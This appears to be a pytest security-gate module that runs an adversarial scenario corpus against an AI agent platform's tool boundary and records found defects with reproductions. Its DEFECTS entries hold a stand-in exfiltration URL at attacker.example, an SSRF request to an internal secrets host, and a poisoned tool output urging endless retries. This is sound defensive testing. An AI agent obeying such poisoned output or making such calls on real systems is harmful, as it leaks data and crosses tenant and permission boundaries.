"""Run every scenario in the corpus against the real system, and record it.

This is the wave's security gate: the point at which the 49 scenarios in
``ALL_SCENARIOS``, authored against no implementation, are executed against the
boundary, the capability layer, the redaction contract, the acquisition seam,
and the claim-support model that now exist. (This module said "46" for as long
as the corpus has had 49 members; the number is now taken from the corpus.)

**How a defect is recorded.** A scenario whose guarantee is genuinely violated
carries ``xfail(strict=True)`` with the reproduction in ``reason``. Strict is
what makes it a record rather than an exemption: the moment the defect is
fixed, the scenario xpasses and the suite goes red, so nobody has to remember
to come back and delete the annotation. The corpus's own consumption contract
says ``expected_to_fail_today`` is a snapshot the harness must re-evaluate, and
this is that re-evaluation — the corpus files are not edited, so the drift
between what its author expected and what is true is visible rather than
smoothed away.

**Six guards against a suite that proves nothing.**

1. ``test_every_scenario_has_an_exerciser`` — the harness cannot report health
   by simply not running anything. Every id in ``ALL_SCENARIOS`` must have an
   exerciser, and every exerciser must name a real scenario.
2. ``TestAPassMustCarryAnOutcomeThatWentTheOtherWay`` — a pass is only accepted
   alongside a *demonstration*, not a description, that the mechanism had a
   reachable opposite outcome. Packet 4D shipped a capability check whose
   ceiling was minted from the request being checked; every test passed, the
   boundary was demonstrably called, and the one control that mattered could
   not fail. The first fix for that required a non-empty control string, which
   18 scenarios satisfied while running against a boundary mutated to deny
   everything. See that class's docstring for which test carries which half of
   the guarantee — an earlier version of this docstring credited the wrong one.
3. ``test_a_capability_mediated_pass_rests_on_an_allowed_call`` — the scenarios
   whose guarantee is enforced *by the capability layer* may not settle for a
   contrast on some other mechanism. Their control must be a real call the
   boundary allowed, which a boundary that denies everything cannot produce.
4. ``test_the_not_exercisable_set_is_declared`` and
   ``test_the_control_free_set_is_declared`` — the set of scenarios nobody can
   run, and the set whose pass rests on no control at all, are each pinned to a
   literal so neither can grow quietly.
5. ``test_no_exerciser_raises_instead_of_observing`` — every exerciser is run
   once *without* its xfail mark. A strict xfail turns an exception into a
   green defect report, so an exerciser that starts raising (because a control
   stopped being reachable, or because the function it calls changed signature)
   would otherwise register as the defect it is annotated for. This test is
   where that shows up red. **``strict=True`` converts a pass into a failure
   and nothing else; it has never had anything to say about a raise.**
6. ``test_every_named_covering_test_still_exists`` — where a scenario is
   unrunnable here and its guarantee is proven in another suite, the pointer at
   that suite is a resolvable node id in :data:`GUARANTEE_PROVEN_BY` rather than
   a sentence in a docstring. Deleting or renaming a covering test turns the
   corpus red instead of leaving it asserting coverage that is gone.

Guards 2, 5 and 6 are three faces of one rule: **an outcome must be asserted
from something observed, never inferred from a test result.** A control that is
computed and not read, a defect record that cannot notice being fixed, and a
coverage claim that cannot notice being deleted are the same mistake.
"""

from __future__ import annotations

from importlib import import_module
from pathlib import Path
from typing import Final

import pytest

from src.core.contracts.capabilities import CapabilityDenialReason
from src.core.tools import ToolOutcomeStatus

from .exercisers import (
    EXERCISERS,
    expired_approval_is_refused,
    expired_grant_is_refused,
)
from .harness import Control, ControlKind, Observation, Verdict
from .registry import ALL_SCENARIOS
from .types import EnforcementStrength, GuaranteeKind, Scenario

_SCENARIOS_BY_ID: Final[dict[str, Scenario]] = {
    scenario.scenario_id: scenario for scenario in ALL_SCENARIOS
}


NOT_EXERCISABLE: Final[frozenset[str]] = frozenset(
    {
        "poisoned-05-cross-run-evidence-borrow",
        "crosstenant-02-cross-tenant-evidence-artifact-link",
        "crosstenant-04-ws-subscription-cross-tenant-run",
        "replay-02-event-log-replay-duplicate-side-effect",
        "replay-05-stale-ws-cursor-resume-duplicate-effect",
    }
)
"""Scenarios with nothing to run against, pinned so the set cannot grow quietly.

Each one's exerciser states its reason. All five are the wave's already known
limits — no tool path holds an ``AsyncSession``, and no Wave 4 event consumer
exists — rather than anything discovered here.

Two of them are unrunnable *in this process only*; see
:data:`DEFECTS_PROVEN_ELSEWHERE`.
"""


CONTROL_FREE: Final[frozenset[str]] = frozenset(
    {
        "sensitive-05-compositional-privilege-laundering",
    }
)
"""Scenarios whose pass rests on no control, pinned so the set cannot grow.

A scenario lands here only when there is genuinely no mechanism that could have
gone the other way — not when writing a control is inconvenient. Each one's
exerciser builds its control with :meth:`Control.absent` and states why in
``why_absent``; the honest consequence is that its verdict demonstrates nothing
about a live mechanism and must not be counted among the scenarios that do.

One member today. ``sensitive-05``'s own guarantee is
``NO_DETERMINISTIC_GUARANTEE_TODAY``: there is no cumulative-effect check
anywhere in the design, so there is nothing to show discriminating. It
previously pointed at ``sensitive-01``'s denial — a different scenario's
observation of a different mechanism.
"""


CAPABILITY_MEDIATED: Final[frozenset[GuaranteeKind]] = frozenset(
    {
        GuaranteeKind.CAPABILITY_DENIED,
        GuaranteeKind.CONTEXT_BINDING_ENFORCED,
        GuaranteeKind.APPROVAL_REQUIRED_AND_SCOPED,
        GuaranteeKind.TRUST_LABEL_NOT_ESCALATED,
    }
)
"""Guarantees the capability layer itself enforces.

A scenario claiming one of these is claiming that ``decide_capability`` made a
*decision*. The only observation that distinguishes a decision from a boundary
which refuses everything is a call the same boundary allowed, so
:func:`test_a_capability_mediated_pass_rests_on_an_allowed_call` requires
exactly that — a contrast on a sanitizer or a validator will not do.
"""


DEFECTS_PROVEN_ELSEWHERE: Final[dict[str, str]] = {}
"""Scenarios unrunnable here that are known violations in the database suite.

Empty, and deliberately kept rather than deleted. It held
``crosstenant-02`` and ``poisoned-05`` while the evidence write path let a row
cite an artifact outside its own tenant or run; both now hold, and
``test_corpus_execution_persistence.py`` carries them as plain assertions.

The mapping exists so that a guarantee this process cannot reach never reads as
"unknown" in the in-process report when it is in fact known to be violated
elsewhere. A defect recorded only where it cannot be re-run is a defect nobody
will notice regressing.

Its counterpart for guarantees that *hold* elsewhere is
:data:`GUARANTEE_PROVEN_BY`, which names the covering tests rather than
describing them.
"""


GUARANTEE_PROVEN_BY: Final[dict[str, tuple[str, ...]]] = {
    "crosstenant-02-cross-tenant-evidence-artifact-link": (
        "tests/security/adversarial/test_corpus_execution_persistence.py"
        "::test_evidence_cannot_reference_another_tenants_artifact",
    ),
    "poisoned-05-cross-run-evidence-borrow": (
        "tests/security/adversarial/test_corpus_execution_persistence.py"
        "::test_evidence_cannot_reference_another_runs_artifact",
    ),
}
"""For each in-process-unrunnable scenario, the tests that actually prove it.

**Why a mapping and not a sentence.** Three of the five ``NOT_EXERCISABLE``
exercisers say, in prose, that their guarantee is exercised somewhere else. That
is a claim which can become false without anything going red: rename or delete
the covering test and the corpus goes on asserting the coverage exists. It is
the same shape as the defect this packet was sent to fix — an outcome inferred
from a test result rather than asserted from an observed fact — and the same
shape as a defect record that cannot notice being fixed, where an exerciser
raising a ``TypeError`` still satisfies its own ``xfail(strict=True)``.

So the pointer is data with an invariant test over it.
:func:`test_every_named_covering_test_still_exists` resolves each entry to a
real, collectible test function; deleting or renaming one turns the corpus red.

**What the check does and does not catch**, stated because a conformance helper
that silently checks nothing is worse than none. It catches a deleted module, a
deleted or renamed function, and a function renamed out of pytest's
``test_*`` discovery pattern. It does not catch a test that still exists but has
been gutted, skipped, or had its assertion weakened — nothing short of mutation
testing catches that, and the corpus does not claim it does.

Entries are per-scenario tuples so a guarantee covered by several tests can name
all of them. ``crosstenant-04`` has no entry: no test anywhere covers it, which
is the honest state and is what its exerciser says.
"""


DEFECTS: Final[dict[str, str]] = {
    "injection-04-homoglyph-ssrf-destination": (
        "No destination allowlist exists. A READ_ONLY-declared fetch tool "
        "holding a valid capability grant fetches https://attacker.example/ "
        "with no check: CapabilityGrant authorizes a tool NAME and has no "
        "field that can express a destination, and neither ToolSpec nor "
        "SourceFetchInput constrains a URL. Reproduce: grant citation_fetch, "
        "invoke with url='https://attacker.example/exfil?run=<run_id>' -> "
        "SUCCEEDED, handler reached."
    ),
    "deputy-01-classic-fetch-redirect": (
        "Same root cause as injection-04, reached through the confused-deputy "
        "path and against an internal host: a granted fetch tool reaches "
        "http://internal-config.cerebro.local/secrets. There is no SSRF "
        "control, no private-range rejection, and no per-task source "
        "allowlist anywhere in src/core/tools/ or src/core/acquisition/."
    ),
    "poisoned-04-recursive-retry-amplification": (
        "No per-task or per-attempt invocation budget exists at the boundary. "
        "50 successful invocations of one tool under one task all execute. "
        "The circuit breaker bounds consecutive FAILURES only, so a tool "
        "output recommending 'repeat_until context exhausted' is bounded by "
        "nothing the boundary owns."
    ),
    "privesc-05-toctu-revoked-grant": (
        "Capability validity is never re-checked before the side effect "
        "lands. The boundary reads its clock once (boundary.py:267) and "
        "authorizes once; the handler then runs for arbitrarily long. "
        "Reproduce: a grant with a 60s window authorizes a handler that "
        "completes an hour later -> SUCCEEDED with completed_at past "
        "expires_at. Grant revocation is not modelled at all, only expiry."
    ),
    "crosstenant-01-client-supplied-organization-override": (
        "The tool write path has no tenant enforcement. ToolInvocation has no "
        "tenant field, and InMemoryToolAuditStore.persist -- the only store "
        "any tool path uses -- accepts organization_id and discards it "
        "(mediation.py:294-304). enforce_tenant_identity is never reached "
        "from any mediated call. ToolInvocationRepository does enforce it, "
        "but nothing constructs one."
    ),
    "crosstenant-03-unscoped-read-by-id": (
        "CRITICAL, pre-existing and still live on this branch. "
        "verify_project_access (src/api/websocket/auth.py:101-124) takes no "
        "organization parameter and returns `user_id is not None`, so any "
        "authenticated user is authorized for any project. Reached from "
        "src/api/routes/websocket.py:211 and :345. `git log -1 -- "
        "src/api/websocket/auth.py` on this branch is 6419b1f (the Wave 3 "
        "merge), so packet 4-Sec's fix is NOT an ancestor of this tree."
    ),
    "crosstenant-05-idempotency-key-collision": (
        "Idempotency dedup is not tenant-scoped, and 4C's reordering does not "
        "reach it. InMemoryToolAuditStore.find_invocation accepts "
        "organization_id and never reads it (mediation.py:283-292); nothing "
        "at the boundary binds a run_id to an organization. Tenant B's "
        "request is genuinely AUTHORIZED -- the grant matches run, task, tool "
        "and scope, and organization_id is not an input to the capability "
        "decision -- so it reaches the lookup, and _require_same_request "
        "finds no mismatch because the two requests differ only in a field "
        "neither check reads. Tenant B receives tenant A's invocation record "
        "without the handler being re-entered."
    ),
    "oversized-01-oversized-query-string": (
        "No input size ceiling exists at any layer. A 2,000,000-character "
        "source_uri on the shipped SourceFetchInput model is validated, "
        "hashed, redacted, and persisted. ToolSpec.__post_init__ requires a "
        "timeout, a sensitivity, and SecretRef-typed credential fields -- but "
        "nothing about size -- so an unbounded field is what a tool author "
        "gets by omission."
    ),
    "oversized-03-oversized-retrieved-snapshot": (
        "FilesystemSnapshotStore.put has no maximum size, and neither the "
        "SnapshotStore protocol nor the acquisition service declares one. An "
        "oversized fetched body is persisted whole and re-read whole on every "
        "future evidence lookup."
    ),
    "oversized-05-unbounded-pagination-request": (
        "Same root cause as oversized-01, on a numeric field: "
        "max_results=999,999,999 is accepted and recorded. Registration never "
        "requires a range bound."
    ),
    "sensitive-04-approval-toctu-revocation": (
        "Approval validity is never re-checked before the side effect lands. "
        "Reproduce: an approval with a 10s window authorizes an EXFILTRATION "
        "handler that completes an hour later -> SUCCEEDED with completed_at "
        "past the approval's expires_at. Same shape as privesc-05, applied to "
        "approvals. Approval revocation is not modelled, only expiry."
    ),
}
"""Every DETERMINISTIC guarantee this harness found violated, with its repro.

Kept here rather than as an edit to the corpus: softening a scenario to make
the suite green is exactly what this packet was told not to do, and a defect
that lives in the harness stays legible as a defect.
"""


def _param(scenario: Scenario) -> pytest.param:
    marks = []
    if scenario.scenario_id in DEFECTS:
        marks.append(
            pytest.mark.xfail(strict=True, reason=DEFECTS[scenario.scenario_id])
        )
    return pytest.param(scenario, id=scenario.scenario_id, marks=marks)


# ----------------------------------------------------------------------------
# guards on the harness itself
# ----------------------------------------------------------------------------


class TestTheHarnessCannotReportHealthByRunningNothing:
    def test_every_scenario_has_an_exerciser(self) -> None:
        missing = sorted(
            scenario.scenario_id
            for scenario in ALL_SCENARIOS
            if scenario.scenario_id not in EXERCISERS
        )
        assert not missing, (
            f"{len(missing)} scenario(s) would never be executed: {missing}. "
            "A corpus nobody runs reports no failures for the same reason a "
            "corpus that passes does."
        )

    def test_no_exerciser_names_a_scenario_that_does_not_exist(self) -> None:
        unknown = sorted(set(EXERCISERS) - set(_SCENARIOS_BY_ID))
        assert not unknown, (
            f"exerciser(s) {unknown} name no scenario in ALL_SCENARIOS; a "
            "renamed scenario would otherwise leave a test running against "
            "nothing"
        )

    def test_the_not_exercisable_set_is_declared(self) -> None:
        assert set(_SCENARIOS_BY_ID) >= NOT_EXERCISABLE
        assert NOT_EXERCISABLE.isdisjoint(DEFECTS), (
            "a scenario cannot be both unrunnable here and reproducible here"
        )

    def test_the_control_free_set_is_declared(self) -> None:
        assert set(_SCENARIOS_BY_ID) >= CONTROL_FREE
        assert CONTROL_FREE.isdisjoint(NOT_EXERCISABLE | set(DEFECTS)), (
            "a control-free pass is a pass; a scenario nobody runs and a "
            "scenario recorded as violated do not need one"
        )

    def test_every_named_covering_test_still_exists(self) -> None:
        """A pointer at another suite's test must not be able to go stale.

        Resolves each node id in :data:`GUARANTEE_PROVEN_BY` to a real function.
        Deleting or renaming a covering test turns this red instead of leaving
        the corpus asserting coverage that no longer exists.
        """

        repo_root = Path(__file__).resolve().parents[3]
        for scenario_id, node_ids in GUARANTEE_PROVEN_BY.items():
            assert node_ids, (
                f"{scenario_id} has an empty covering-test tuple; a scenario "
                "with no cover elsewhere simply has no entry here"
            )
            for node_id in node_ids:
                module_path, _, qualname = node_id.partition("::")
                assert qualname, f"{node_id} names no test function"
                path = repo_root / module_path
                assert path.is_file(), (
                    f"{scenario_id} names {module_path}, which does not exist. "
                    f"The corpus records this guarantee as proven there."
                )
                module = import_module(module_path[:-3].replace("/", "."))
                target: object = module
                for part in qualname.split("::"):
                    assert hasattr(target, part), (
                        f"{scenario_id} names {node_id}, but {part!r} is not "
                        f"there any more. Either restore it, point at whatever "
                        f"replaced it, or move the scenario out of "
                        f"NOT_EXERCISABLE — but the corpus may not go on "
                        f"claiming a cover that is gone."
                    )
                    target = getattr(target, part)
                assert callable(target), f"{node_id} does not resolve to a test"
                assert qualname.rsplit("::", 1)[-1].startswith("test_"), (
                    f"{node_id} would not be collected by pytest: this "
                    f"project's python_functions pattern is 'test_*', so a "
                    f"function renamed off that prefix still exists and is "
                    f"never run"
                )

    def test_every_covering_pointer_names_an_unrunnable_scenario(self) -> None:
        assert set(GUARANTEE_PROVEN_BY) <= NOT_EXERCISABLE, (
            "a scenario this process can run proves its own guarantee here; "
            "pointing at another suite would let the in-process result rot "
            "unnoticed"
        )

    def test_defects_proven_elsewhere_are_unrunnable_here(self) -> None:
        assert set(DEFECTS_PROVEN_ELSEWHERE) <= NOT_EXERCISABLE, (
            "a scenario reproducible in this process belongs in DEFECTS, "
            "where it is re-run on every suite execution"
        )

    def test_every_defect_names_a_deterministic_scenario(self) -> None:
        advisory = sorted(
            scenario_id
            for scenario_id in DEFECTS
            if _SCENARIOS_BY_ID[scenario_id].strength
            is not EnforcementStrength.DETERMINISTIC
        )
        assert not advisory, (
            f"{advisory} are ADVISORY; an advisory result is never a "
            "reportable boundary defect, so recording one as an xfail would "
            "misstate what the corpus proves"
        )


# ----------------------------------------------------------------------------
# the corpus itself
# ----------------------------------------------------------------------------


@pytest.mark.parametrize("scenario", [_param(s) for s in ALL_SCENARIOS])
async def test_scenario_guarantee_holds(scenario: Scenario) -> None:
    """Run one scenario against the real system and assert its floor held."""

    observation = await EXERCISERS[scenario.scenario_id]()

    if observation.verdict is Verdict.NOT_EXERCISABLE:
        assert scenario.scenario_id in NOT_EXERCISABLE, (
            f"{scenario.scenario_id} reported itself unrunnable but is not in "
            f"NOT_EXERCISABLE; add it there with its reason so the set of "
            f"scenarios nobody runs stays visible. Reason given: "
            f"{observation.evidence}"
        )
        pytest.skip(observation.evidence)

    assert scenario.scenario_id not in NOT_EXERCISABLE, (
        f"{scenario.scenario_id} is listed as unrunnable but produced "
        f"{observation.verdict.value}; remove it from NOT_EXERCISABLE"
    )

    assert observation.verdict is not Verdict.VIOLATED, (
        f"{scenario.scenario_id}: {scenario.expected_outcome.guarantee.value} "
        f"was not enforced.\n\n{observation.evidence}\n\n"
        f"The corpus states that when the named mechanism is absent the "
        f"outcome must still be denial: "
        f"{scenario.expected_outcome.on_missing_enforcement}"
    )


_EXERCISED: Final[list[Scenario]] = [
    s
    for s in ALL_SCENARIOS
    if s.scenario_id not in DEFECTS and s.scenario_id not in NOT_EXERCISABLE
]


class TestAPassMustCarryAnOutcomeThatWentTheOtherWay:
    """The guard against a pass that rests on a sentence.

    **Which test carries which half, stated precisely, because the previous
    version of this docstring got it wrong.** It claimed the suite-level test
    was a second copy of the dataclass check, so that deleting
    ``Observation.__post_init__`` would not silently remove the guarantee. It
    was not: the suite-level test asserted ``observation.control.strip()`` —
    string length — and passed unchanged with the dataclass check deleted. The
    real coverage came only from
    :func:`test_observation_refuses_a_pass_whose_control_did_not_go_the_other_way`
    below.

    Now:

    - :meth:`test_the_control_is_a_demonstration_and_not_a_description` runs the
      real exerciser and asserts on the recorded outcome. It catches a scenario
      whose control *stops being reachable* — which is what a sibling packet
      moving an outcome looks like — and it fails whether or not the dataclass
      check exists.
    - :func:`test_observation_refuses_a_pass_whose_control_did_not_go_the_other_way`
      is the direct check on the mechanism itself: delete
      ``Observation.__post_init__``'s control clause and that test goes red.

    Two tests, two distinct failure modes, neither standing in for the other.
    """

    @pytest.mark.parametrize(
        "scenario", [pytest.param(s, id=s.scenario_id) for s in _EXERCISED]
    )
    async def test_the_control_is_a_demonstration_and_not_a_description(
        self, scenario: Scenario
    ) -> None:
        observation = await EXERCISERS[scenario.scenario_id]()
        assert observation.verdict in {Verdict.HELD, Verdict.HELD_VIA_FLOOR}
        control = observation.control
        assert control is not None, (
            f"{scenario.scenario_id} reported {observation.verdict.value} "
            "without a paired outcome showing the mechanism could have gone "
            "the other way"
        )
        if control.kind is ControlKind.NO_CAPABILITY_CONTROL:
            assert scenario.scenario_id in CONTROL_FREE, (
                f"{scenario.scenario_id} declared that no control is reachable "
                f"but is not in CONTROL_FREE; add it there so the set of passes "
                f"resting on nothing stays countable. Reason given: "
                f"{control.why_absent}"
            )
            return
        assert scenario.scenario_id not in CONTROL_FREE, (
            f"{scenario.scenario_id} is pinned as control-free but produced a "
            f"{control.kind.value} control; remove it from CONTROL_FREE"
        )
        assert control.demonstrated, (
            f"{scenario.scenario_id} reported {observation.verdict.value}, but "
            f"{control.diagnosis}"
        )

    @pytest.mark.parametrize(
        "scenario",
        [
            pytest.param(s, id=s.scenario_id)
            for s in _EXERCISED
            if s.expected_outcome.guarantee in CAPABILITY_MEDIATED
        ],
    )
    async def test_a_capability_mediated_pass_rests_on_an_allowed_call(
        self, scenario: Scenario
    ) -> None:
        """A capability decision is only visible against an allowed call.

        Every other control shape can be satisfied while the capability layer
        is refusing everything: a sanitizer still discriminates, a validator
        still rejects a malformed field, a contract still refuses an
        unsupported claim. Only ``ALLOWED_CALL`` cannot be produced by a
        boundary that denies unconditionally, because it is built from a
        :class:`ToolOutcome` and reads its status.
        """

        observation = await EXERCISERS[scenario.scenario_id]()
        control = observation.control
        assert control is not None and control.kind is ControlKind.ALLOWED_CALL, (
            f"{scenario.scenario_id} claims "
            f"{scenario.expected_outcome.guarantee.value}, which the capability "
            f"layer enforces, so its control must be a call the same boundary "
            f"ALLOWED. It carries "
            f"{'nothing' if control is None else control.kind.value}."
        )
        assert control.demonstrated, control.diagnosis


@pytest.mark.parametrize(
    "scenario",
    [
        pytest.param(s, id=s.scenario_id)
        for s in ALL_SCENARIOS
        if s.strength is EnforcementStrength.ADVISORY
    ],
)
async def test_an_advisory_result_is_never_credited_as_the_security_bar(
    scenario: Scenario,
) -> None:
    """An ADVISORY pass must not be recorded as a satisfied guarantee.

    The wave's non-goal makes prompt wording and classifiers defense layers
    rather than boundaries. The corpus encodes that in ``strength``; this
    asserts the harness honours it, by requiring every advisory observation to
    carry an explicit reason it is worth less than it reads.
    """

    observation = await EXERCISERS[scenario.scenario_id]()
    if observation.verdict is Verdict.NOT_EXERCISABLE:
        pytest.skip(observation.evidence)
    assert observation.weakened_by, (
        f"{scenario.scenario_id} is ADVISORY, so its result cannot stand as "
        "the security bar; the observation must say why"
    )
    # The assertion above is tuple truthiness, which ``("",)`` satisfies — the
    # same shape as the control string this packet removed. Observation refuses
    # a blank entry at construction; this states that the floor exists so a
    # reader does not take the line above for more than it is.
    assert all(reason.strip() for reason in observation.weakened_by)


class TestTheTwoTimeOfUseDefectsAreAboutRecheckingAndNotAboutExpiry:
    """Pin what privesc-05 and sensitive-04 actually claim.

    Both are recorded above as defects because validity is never re-evaluated
    before the side effect lands. That claim is only meaningful if the expiry
    checks themselves work — otherwise the honest finding would be the much
    larger "expiry is not implemented", and the reproduction in ``DEFECTS``
    would be describing the wrong bug.

    These exist because a suite-level mutation check found both expiry branches
    SURVIVING: the exercisers computed a control for each, but only inside the
    unreachable branch of an observation that had already been ruled VIOLATED,
    so nothing asserted either one. A control that is computed and never
    asserted is not a control.
    """

    async def test_a_grant_that_expired_before_the_request_is_refused(self) -> None:
        outcome = await expired_grant_is_refused()
        assert outcome.status is ToolOutcomeStatus.DENIED
        assert (
            outcome.decision is not None
            and outcome.decision.denial_reason is CapabilityDenialReason.GRANT_EXPIRED
        )

    async def test_an_approval_that_expired_before_the_request_is_refused(
        self,
    ) -> None:
        outcome = await expired_approval_is_refused()
        assert outcome.status is ToolOutcomeStatus.DENIED
        assert (
            outcome.decision is not None
            and outcome.decision.denial_reason
            is CapabilityDenialReason.APPROVAL_EXPIRED
        )


def test_the_report_covers_every_scenario_exactly_once() -> None:
    """The three outcome buckets partition the corpus.

    Without this a scenario could drop out of all of them — no defect, no skip,
    and no assertion — which is the shape of a corpus that looks clean because
    nothing looked at it.
    """

    exercised = set(_SCENARIOS_BY_ID) - NOT_EXERCISABLE - set(DEFECTS)
    assert exercised | NOT_EXERCISABLE | set(DEFECTS) == set(_SCENARIOS_BY_ID)
    assert len(exercised) + len(NOT_EXERCISABLE) + len(DEFECTS) == len(ALL_SCENARIOS)


@pytest.mark.parametrize(
    "scenario",
    [
        pytest.param(s, id=s.scenario_id)
        for s in ALL_SCENARIOS
        if s.scenario_id not in NOT_EXERCISABLE
    ],
)
async def test_no_exerciser_raises_instead_of_observing(scenario: Scenario) -> None:
    """Every exerciser runs to an Observation, xfail marks deliberately absent.

    ``test_scenario_guarantee_holds`` carries ``xfail(strict=True)`` for the
    scenarios in ``DEFECTS``, which means an *exception* out of one of those
    exercisers reads as the expected failure and the suite stays green — the
    shape ``replay-03`` hit once already, where the guarantee working raised
    ``IdempotencyConflictError`` and produced a defect report.

    Now that a control is validated at construction, a sibling change that
    makes some control unreachable turns into a ``ValueError`` from
    ``Observation``. This test is un-marked so that lands red, with the
    control's own diagnosis in the message, rather than disappearing into an
    xfail.
    """

    observation = await EXERCISERS[scenario.scenario_id]()
    assert isinstance(observation, Observation)


def test_a_fixed_defect_surfaces_here_rather_than_as_an_xpass() -> None:
    """Pin how a scenario in ``DEFECTS`` reports that its defect is gone.

    ``xfail(strict=True)`` is documented above as the thing that notices a fix:
    the scenario xpasses and the suite goes red. **For the scenarios in
    ``DEFECTS`` that is no longer the path**, and the difference is worth
    pinning rather than discovering.

    A violated scenario carries ``control=None``, because there is no pass to
    justify and a control computed into a branch nothing reaches is what this
    packet removed. So the first run in which such a guarantee *holds* builds
    ``Observation(verdict=HELD, control=None)``, which raises — and a raise
    satisfies ``strict=True`` exactly as a failure does. The fix is caught by
    :func:`test_no_exerciser_raises_instead_of_observing`, not by an xpass.

    Verified against the real thing rather than reasoned: stubbing
    ``verify_project_access`` to refuse turns
    ``test_scenario_guarantee_holds[crosstenant-03]`` green and
    ``test_no_exerciser_raises_instead_of_observing[crosstenant-03]`` red.

    That is still a red suite, which is what matters. But the message a reader
    gets is about a missing control, so it has to say what that most likely
    means. This test pins that it does.
    """

    with pytest.raises(ValueError, match="DEFECT HAS BEEN FIXED") as caught:
        Observation(verdict=Verdict.HELD, evidence="the guarantee now holds")
    assert "delete the entry from DEFECTS" in str(caught.value)


def test_a_weakening_reason_cannot_be_blank() -> None:
    """The ADVISORY caveat has a floor, even though it is prose.

    ``test_an_advisory_result_is_never_credited_as_the_security_bar`` asserts
    ``observation.weakened_by`` — tuple truthiness, which ``("",)`` satisfies.
    That is the "a sentence exists" shape this packet removed from ``control``,
    surviving in the one guard the packet did not originally touch. It is a
    smaller hole, because a caveat is irreducibly prose and no machine can
    check that a reason is *good*. It can check that there is one.
    """

    for blank in ("",), ("   ",), ("a real reason", "\n"):
        with pytest.raises(ValueError, match="weakened_by"):
            Observation(verdict=Verdict.VIOLATED, evidence="held", weakened_by=blank)
    # A stated reason is accepted, so the check discriminates.
    Observation(
        verdict=Verdict.VIOLATED,
        evidence="the effect occurred",
        weakened_by=("the grant is self-issued; no authority decided it",),
    )


def test_observation_requires_a_control_for_a_pass() -> None:
    """The control requirement is enforced, not merely documented."""

    with pytest.raises(ValueError, match="control"):
        Observation(verdict=Verdict.HELD, evidence="something held")
    with pytest.raises(ValueError, match="control"):
        Observation(verdict=Verdict.HELD_VIA_FLOOR, evidence="the floor held")
    # A violation needs no control: there is no passing outcome to justify.
    Observation(verdict=Verdict.VIOLATED, evidence="the effect occurred")


def test_observation_refuses_a_pass_whose_control_did_not_go_the_other_way() -> None:
    """A control that records the wrong outcome is refused, not re-worded.

    This is the test that goes red if ``Observation.__post_init__``'s control
    clause is deleted. It builds the two shapes that actually shipped in this
    wave: a paired call that came back DENIED, and a "contrast" between two
    identical results.
    """

    denied_control = Control(
        kind=ControlKind.ALLOWED_CALL,
        what="academic_search on the same boundary and grant list",
        observed=ToolOutcomeStatus.DENIED.value,
        handler_invocations=0,
    )
    assert not denied_control.demonstrated
    with pytest.raises(ValueError, match="did not go the other way"):
        Observation(
            verdict=Verdict.HELD,
            evidence="send_notification was denied",
            control=denied_control,
        )

    inert_contrast = Control.contrasting_result(
        what="a benign input through the same sanitizer",
        on_attack="was_modified=False",
        on_control="was_modified=False",
    )
    assert not inert_contrast.demonstrated
    with pytest.raises(ValueError, match="did not go the other way"):
        Observation(
            verdict=Verdict.HELD_VIA_FLOOR,
            evidence="the sanitizer left it alone",
            control=inert_contrast,
        )

    # An allowed call whose handler never ran proves the decision, not the
    # effect; a scenario that supplies the count is taken at its word.
    unreached = Control(
        kind=ControlKind.ALLOWED_CALL,
        what="a call that succeeded without reaching its handler",
        observed=ToolOutcomeStatus.SUCCEEDED.value,
        handler_invocations=0,
    )
    assert not unreached.demonstrated
    with pytest.raises(ValueError, match="did not go the other way"):
        Observation(verdict=Verdict.HELD, evidence="held", control=unreached)

    # Declared absence is the one accepted non-demonstration, and it must say
    # why. CONTROL_FREE pins which scenarios may use it.
    Observation(
        verdict=Verdict.HELD_VIA_FLOOR,
        evidence="four benign calls all ran",
        control=Control.absent(
            what="a cumulative-effect rule", why="no such mechanism exists"
        ),
    )
    with pytest.raises(ValueError, match="why no opposite outcome"):
        Control.absent(what="a cumulative-effect rule", why="  ")
